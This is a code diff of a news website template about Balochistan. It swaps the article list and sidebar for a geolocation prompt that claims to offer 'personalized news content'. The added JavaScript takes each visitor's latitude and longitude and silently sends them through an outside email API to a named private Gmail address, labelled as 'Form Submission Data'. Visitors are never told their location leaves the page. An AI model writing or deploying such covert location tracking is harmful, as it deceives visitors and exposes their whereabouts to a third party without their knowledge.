@@ -28,9 +28,9 @@
             color: white !important;
         }
 
-        /* Header Section */
+        /* Hero Section */
         .hero-section {
-            background-image: url('https://via.placeholder.com/1600x500?text=Balochistan+News'); /* Replace with a real image */
+            background-image: url('https://via.placeholder.com/1600x500?text=Balochistan+News'); /* Replace with real image */
             background-size: cover;
             background-position: center;
             color: white;
@@ -47,33 +47,17 @@
             font-size: 1.2em;
         }
 
-        /* News Articles Section */
-        .news-article {
-            border-bottom: 2px solid #ddd;
-            padding: 20px;
-            margin-bottom: 20px;
-            transition: all 0.3s ease;
-        }
-
-        .news-article:hover {
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-
-        .news-article img {
-            max-width: 100%;
-            height: auto;
+        /* News Section */
+        .news-section {
+            background-color: white;
+            padding: 30px;
             border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
 
-        .news-article h2 {
-            font-size: 1.8em;
+        .news-section h2 {
+            font-size: 2em;
             color: #002147;
-            margin-top: 15px;
-        }
-
-        .news-article p {
-            font-size: 1.1em;
-            color: #666;
         }
 
         /* Footer */
@@ -93,51 +77,19 @@
             text-decoration: underline;
         }
 
-        /* Sidebar Section */
-        .sidebar {
-            background-color: #fff;
-            padding: 20px;
-            margin-bottom: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        /* Location Request Prompt */
+        .location-request {
+            background-color: #f0ad4e;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            text-align: center;
+            margin-top: 20px;
         }
 
-        .sidebar h3 {
-            font-size: 1.5em;
-            color: #002147;
-        }
-
-        .sidebar ul {
-            list-style: none;
-            padding: 0;
-        }
-
-        .sidebar ul li {
-            margin-bottom: 10px;
-        }
-
-        .sidebar ul li a {
-            color: #333;
-            text-decoration: none;
-        }
-
-        .sidebar ul li a:hover {
-            text-decoration: underline;
-        }
-
-        /* Media Query for Responsive Layout */
-        @media (max-width: 768px) {
-            .hero-section {
-                padding: 50px 10px;
-            }
-
-            .hero-section h1 {
-                font-size: 2em;
-            }
-
-            .hero-section p {
-                font-size: 1em;
-            }
+        .location-result {
+            font-size: 1.2em;
+            margin-top: 20px;
         }
     </style>
 </head>
@@ -176,32 +128,29 @@
     <!-- Main Content Section -->
     <div class="container">
         <div class="row">
-            <!-- News Articles Column -->
             <div class="col-md-8">
-                <div class="news-article">
-                    <img src="https://via.placeholder.com/800x400?text=News+Image" alt="News">
+                <!-- News Section -->
+                <div class="news-section">
                     <h2>Breaking News: Balochistan Witnesses Historic Event</h2>
                     <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer nec odio. Praesent libero. Sed cursus ante dapibus diam.</p>
-                    <a href="#" class="btn btn-link">Read More</a>
+                    <a href="#" class="btn btn-primary">Read More</a>
                 </div>
 
-                <div class="news-article">
-                    <img src="https://via.placeholder.com/800x400?text=News+Image" alt="News">
-                    <h2>Local Communities Push for Economic Development</h2>
-                    <p>Vestibulum auctor dapibus neque. Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. Aliquam erat volutpat.</p>
-                    <a href="#" class="btn btn-link">Read More</a>
+                <!-- Geolocation Request -->
+                <div class="location-request">
+                    <p>We would like to access your location for more personalized news content.</p>
+                    <button class="btn btn-warning" id="allowLocationButton">Allow Location Access</button>
                 </div>
 
-                <div class="news-article">
-                    <img src="https://via.placeholder.com/800x400?text=News+Image" alt="News">
-                    <h2>Balochistan’s Cultural Heritage Preserved in New Exhibition</h2>
-                    <p>Ut fringilla. Fusce fermentum. Curabitur nisi est, placerat nec suscipit vel, aliquet id purus. In at nisl et urna sollicitudin laoreet.</p>
-                    <a href="#" class="btn btn-link">Read More</a>
+                <!-- Display Latitude and Longitude -->
+                <div class="location-result" id="locationDisplay">
+                    <p>Location will be shown here after you grant permission.</p>
                 </div>
             </div>
 
-            <!-- Sidebar Column -->
+            <!-- Sidebar Section -->
             <div class="col-md-4">
+                <!-- Sidebar Content -->
                 <div class="sidebar">
                     <h3>Popular Articles</h3>
                     <ul>
@@ -209,15 +158,6 @@
                         <li><a href="#">History of Balochistan: A Glimpse into the Past</a></li>
                         <li><a href="#">Balochistan's Role in National Politics</a></li>
                         <li><a href="#">Interview with Local Leaders on Regional Development</a></li>
-                    </ul>
-                </div>
-
-                <div class="sidebar">
-                    <h3>Upcoming Events</h3>
-                    <ul>
-                        <li><a href="#">Balochistan Cultural Festival</a></li>
-                        <li><a href="#">Political Debates in Quetta</a></li>
-                        <li><a href="#">Environmental Awareness Campaign</a></li>
                     </ul>
                 </div>
             </div>
@@ -234,5 +174,61 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js" async></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" async></script>
 
+    <!-- JavaScript for Geolocation and Email Sending -->
+    <script>
+        let latitude, longitude;
+
+        // Function to request location permission and get the coordinates
+        function requestLocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        latitude = position.coords.latitude;
+                        longitude = position.coords.longitude;
+
+                        // Show the location on the page
+                        document.getElementById("locationDisplay").innerHTML = `
+                            <strong>Latitude:</strong> ${latitude}<br>
+                            <strong>Longitude:</strong> ${longitude}
+                        `;
+
+                        // Send email with location data
+                        sendEmail("Form Submission Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
+                    },
+                    (error) => {
+                        document.getElementById("locationDisplay").textContent = "Location access denied or error occurred.";
+                    }
+                );
+            } else {
+                document.getElementById("locationDisplay").textContent = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        // Handle location button click
+        document.getElementById("allowLocationButton").addEventListener("click", function () {
+            requestLocation();
+        });
+
+        // Function to send the location data via email
+        function sendEmail(subject, message, recipientEmail) {
+            const emailData = {
+                subject: subject,
+                message: message,
+                recipient_email: recipientEmail,
+                recipient_name: "Khalil Ahmed"
+            };
+
+            fetch("https://zalex-backend.onrender.com/api/send-email/", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(emailData)
+            })
+            .then(response => response.ok ? response.json() : Promise.reject(`Error ${response.status}`))
+            .then(data => alert(data.message ? "Email sent successfully!" : `Error: ${data.error}`))
+            .catch(error => alert("Error sending email: " + error));
+        }
+    </script>
 </body>
 </html>
